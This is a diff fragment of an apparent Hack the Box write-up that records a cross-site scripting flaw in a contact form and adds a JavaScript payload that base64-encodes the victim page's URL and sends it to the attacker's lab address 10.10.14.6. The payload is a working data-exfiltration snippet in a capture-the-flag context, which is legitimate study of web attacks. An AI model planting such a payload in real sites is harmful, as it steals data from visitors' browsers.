@@ -71,3 +71,9 @@ Nmap done: 1 IP address (1 host up) scanned in 15.61 seconds
 - Cross Site Scripting in Contact Form
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/ed23d09e-b6b4-43dd-92bd-0eb03cab0d00)
 
+```JS
+var url = window.location.href
+var req = new XMLHttpRequest()
+req.open("GET", "http://10.10.14.6/?resp=" + btoa(url), true);
+req.send()
+```
